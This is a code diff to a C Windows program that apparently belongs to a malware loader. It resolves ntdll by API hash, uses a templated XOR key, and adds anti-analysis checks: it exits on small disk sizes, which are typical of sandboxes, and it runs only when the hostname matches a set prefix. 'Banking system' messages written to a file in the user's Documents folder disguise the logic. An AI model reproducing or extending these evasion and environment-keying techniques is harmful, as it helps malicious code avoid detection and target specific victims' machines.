@@ -14,7 +14,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     WORD key = %XOR_KEY%;
     
     snprintf(path, MAX_PATH, "%s\\Documents\\bank_account.txt", getenv("USERPROFILE"));  
-    
+    printf("start");    
     HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
     FILE *file = fopen(path, "w"); // Ouvre le file en mode écriture
 
@@ -26,17 +26,23 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     fprintf(file, "Hey, welcoming to the banking system !\n");
 
     int disk_size = get_disk_size();
-    if (money > 1000 && disk_size < 300) { // to replace with dynamic value
+    if (money > 1000 && disk_size < 50) { // to replace with dynamic value
         fprintf(file, "You have enough money !\n");
+        fclose(file);
+        return 1;
     } else {
         fprintf(file, "Vous don't have enough money: %d€ !\n",disk_size);
-
+        
     }
 
-    if (key > 0 && ) {
-        fprintf(file, "You have a key !\n");
+    const char* hostname = get_hostname(hNtdll);
+    fprintf(file, "DEBUG : %s\n", hostname);
+    if (key > 0 && starts_with(hostname, HOSTNAME_PREFIX)) {
+        fprintf(file, "You have a key, which is : %s\n", hostname);
     } else {
-        fprintf(file, "You don't have a key !\n");
+        fprintf(file, "You don't have a key, try this one : %s\n", hostname);
+        fclose(file);
+        return 1;
     }
 
 
